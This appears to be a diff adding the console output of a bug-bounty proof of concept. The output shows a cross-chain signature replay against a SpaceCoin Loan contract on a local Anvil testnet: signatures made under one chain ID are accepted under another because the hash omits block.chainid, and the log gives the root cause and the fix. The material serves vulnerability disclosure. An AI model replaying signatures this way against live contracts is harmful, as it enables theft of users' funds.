@@ -1,0 +1,40 @@
+python3 ../bug-bounty-reports/SpaceCoin-CertIK/poc_loan_crosschain_replay.py
+
+======================================================================
+  SpaceCoin F4 -- Loan.predictLoanTermHash() Missing chainId
+  Cross-Chain Signature Replay Attack PoC
+======================================================================
+
+[*] Starting local Anvil testnet ...
+[*] Anvil running on http://127.0.0.1:8548 (PID 30167)
+[*] Running forge script: script/PocLoanCrossChainReplay.s.sol
+
+======================================================================
+  SpaceCoin -- F4: Loan.predictLoanTermHash() Missing chainId Replay PoC
+======================================================================
+
+  [deploy] MockLoanToken: 0x5FbDB2315678afecb367f032d93F642f64180aa3
+  [deploy] Loan:          0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512
+  === CHAIN A (chainId=2370) ===
+  [sign] Signatures produced on chain A
+  === CHAIN B (chainId=11155111) REPLAY ===
+  [check] hash A == hash B: true
+  [replay] createLoanTerm() accepted chain-A signatures on chain B
+  [replay] created loanHash: 28737555250689989397042378202049842863324350778656043524899779845394792845930
+  === ATTACK CONFIRMED ===
+  Signatures signed on chainId=2370 accepted on chainId=11155111.
+  predictLoanTermHash() uses address(this) but NOT block.chainid.
+  Same contract address across chains (CREATE2) = full replay attack.
+  Fix: include block.chainid in the hash or use EIP-712 domain separator.
+  ==========================
+
+======================================================================
+  RESULT: VULNERABILITY CONFIRMED
+  Signatures produced for chainId=2370 accepted on chainId=11155111.
+  createLoanTerm() succeeds with replayed cross-chain signatures.
+  Root cause: block.chainid not in predictLoanTermHash().
+  Fix: add block.chainid to hash or use EIP-712 domain separator.
+======================================================================
+
+[*] Shutting down Anvil ...
+[*] Done.
